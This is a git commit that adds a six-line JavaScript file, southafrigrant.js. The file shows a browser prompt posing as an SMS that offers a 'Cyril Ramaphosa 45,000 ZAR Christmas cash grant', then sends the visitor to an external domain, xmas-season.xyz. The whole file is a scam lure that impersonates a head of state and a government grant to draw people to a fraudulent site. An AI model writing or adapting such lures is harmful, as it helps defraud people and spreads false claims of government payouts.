849f4003495078f14af6ea06e677bd8c0f35fa6d
bigetijazz14 <bigetijazz14@gmail.com>
2024-12-03 01:43:10 -0800

    Create southafrigrant.js

---
+++ southafrigrant.js
@@ -0,0 +1,6 @@
+
+var password = 'CLAIM 45,000 ZAR'
+password=prompt('SMS: Congratulations, you are eligible for CYRIL RAMAPHOSA 45,000 ZAR CHRISTMAS CASH GRANT FOR ALL, Please press OK to CLAIM Cash Prize','CLAIM 45,000 ZAR');
+if (password != 'CLAIM 45,000 ZAR') {
+location.href='https://www.xmas-season.xyz/45000ZAR-grants';
+}
